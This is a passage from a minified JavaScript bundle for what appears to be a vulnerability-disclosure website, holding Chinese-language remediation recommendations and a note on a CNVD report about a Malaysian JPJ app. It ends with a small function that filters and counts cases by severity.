密钥","中期措施（1-2周内）：开展全面安全审计，检查是否存在其他类似问题；实施代码审查制度，确保调试代码不会进入生产环境","长期措施（1-3个月）：建立安全开发生命周期（SDL）流程；对开发团队进行安全培训；引入自动化安全扫描工具（静态代码分析、移动应用安全检测）","合规措施（持续）：按照 PDPA 要求进行数据保护影响评估（DPIA）；建立数据泄露应急响应机制；定期进行第三方安全审计"]},{type:"info-box",icon:"fa-shield-heart",text:"本报告已于 2025-03-20 通过 CNVD 提交至 MYJPJ 官方（CNVD-C-2025-176294），并在 2025-04-15 完成 CNVD 归档。希望 JPJ 能够认真对待此次披露，推动马来西亚政府应用安全水平的整体提升。"}]}]}],g={total:t.length,critical:t.filter(e=>e.severity==="critical").length,high:t.filter(e=>e.severity==="high").length,medium:t.filter(e=>e.severity==="medium").length,low:t.filter(e=>e.severity==="low").length};function m(){const e=c(t),n=c(g),o=c(""),s=c("all"),i=d(()=>e.value.filter(a=>{const r=!o.value||a.title.toLowerCase().includes(o.value.toLowerCase())||a.description.toLowerCase().includes(o.value.toLowerCase())||a.tags.some(p=>p.label.toLowerCase().includes(o.value.toLowerCase())),l=s.value==="all"||a.severity===s.value;return r&&l}));return{allCases:e,stats:n,searchQuery:o,severityFilter:s,filteredCases:i,getCaseById:a=>e.value.find(r=>r.id===a),severityLabel:a=>({critical:"严重",high:"高危",medium:"中危",low:"低危"})[a]}}export{m as u};
